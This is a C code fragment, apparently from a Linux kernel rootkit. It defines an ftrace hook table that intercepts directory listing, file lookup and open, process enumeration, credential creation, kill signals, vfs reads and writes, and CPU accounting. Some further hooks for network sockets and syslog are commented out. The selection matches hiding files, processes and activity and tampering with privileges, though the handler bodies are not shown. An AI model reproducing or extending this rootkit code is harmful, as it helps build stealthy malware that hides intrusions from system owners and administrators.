#define write_zero	"write_null"
static struct ftrace_hook hooks[] = {
	/*HOOK("tcp4_seq_show", bds_tcp4_seq_show, &orig_tcp4_seq_show),
	HOOK("tcp6_seq_show", bds_tcp6_seq_show, &orig_tcp6_seq_show),
	HOOK("__x64_sys_getdents64", rk_getdents64, &orig_getdents64),
	HOOK("__x64_sys_getdents", rk_getdents, &orig_getdents),
	HOOK("__x64_sys_kill", bds_kill, &orig_kill),*/
	HOOK(write_zero, rk_write_zero, &orig_write_zero),
	HOOK("vfs_read", rk_vfs_read, &orig_vfs_read),
	HOOK("vfs_write", rk_vfs_write, &orig_vfs_write),
	//HOOK(SYSCALL_NAME("sys_write"), rk_sys_write, &orig_sys_write),

	//HOOK("devkmsg_read", rk_devkmsg_read, &orig_devkmsg_read),
	//HOOK("do_syslog" ,  rk_do_syslog,  &orig_do_syslog),
	

	HOOK("filldir", rk_filldir, &orig_filldir),
	HOOK("filldir64" ,  rk_filldir64,  &orig_filldir64),
	HOOK("fillonedir", rk_fillonedir, &orig_fillonedir),
	HOOK("compat_fillonedir", rk_compat_fillonedir, &orig_compat_fillonedir),
	HOOK("compat_filldir" ,  rk_compat_filldir,  &orig_compat_filldir),
	HOOK("d_lookup" ,  rk_d_lookup,  &orig_d_lookup),
	HOOK("__d_lookup" ,  rk___d_lookup,  &orig___d_lookup),
	HOOK("do_sys_openat2" ,  rk_do_sys_openat2,  &orig_do_sys_openat2),
	HOOK("user_path_at_empty" ,  rk_user_path_at_empty,  &orig_user_path_at_empty),
	HOOK("do_unlinkat", rk_do_unlinkat, &orig_do_unlinkat),




	HOOK("copy_creds", rk_copy_creds, &orig_copy_creds),
	HOOK("exit_creds", rk_exit_creds, &orig_exit_creds),
	HOOK("find_task_by_vpid", rk_find_task_by_vpid, &orig_find_task_by_vpid),
	HOOK("vfs_getattr" ,  rk_vfs_getattr,  &orig_vfs_getattr),

	//HOOK("vfs_statx", rk_vfs_statx, &orig_vfs_statx),
	HOOK(SYSCALL_NAME("sys_kill"), rk___x64_sys_kill, &orig___x64_sys_kill),
	HOOK("next_tgid", rk_next_tgid, &orig_next_tgid),
	HOOK("account_process_tick", rk_account_process_tick, &orig_account_process_tick),

	//HOOK("sys_execve", fh_sys_execve, &real_sys_execve),
};






